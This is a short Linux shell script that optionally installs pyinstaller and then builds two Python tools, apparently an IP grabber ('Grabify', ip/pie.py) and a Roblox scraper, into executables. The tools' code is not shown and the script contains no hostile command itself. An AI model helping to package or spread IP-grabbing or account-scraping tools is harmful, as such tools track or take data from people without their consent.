printf "\033[1;32mGrabify On Linux\033[0m\n"

printf "Would you like to install prerequisites (AKA. \033[34;1mpyinstaller\033[0m) ?\n"

printf "(ask) "

read yn

if [ $yn == "yes" ] 
then
  python3 -m pip install pyinstaller
fi

printf "\033[1mbuilding grabify-pie...\033[0m"

pyinstaller --distpath=output-bins ip/pie.py
pyinstaller --distpath=output-bins roblox/roblox-scraper.py

clear

printf "\033[1msuccessfully built grabify-pie! gotta give love to Linux!\033[0m"
